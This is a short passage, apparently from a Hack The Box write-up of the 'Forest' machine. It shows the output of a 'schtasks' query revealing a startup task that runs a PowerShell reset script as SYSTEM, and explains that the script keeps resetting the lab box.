Querying the details confirms it:

```

C:\>schtasks /query /tn restore /v /fo list

Folder: \
HostName:                             FOREST
TaskName:                             \restore
Next Run Time:                        N/A
Status:                               Running
Logon Mode:                           Interactive/Background
Last Run Time:                        10/19/2019 9:22:00 AM
Last Result:                          267009
Author:                               HTB\Administrator
Task To Run:                          powershell.exe -ep bypass C:\Users\Administrator\Documents\revert.ps1
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

```

The script runs at system startup, continually resetting and sleeping.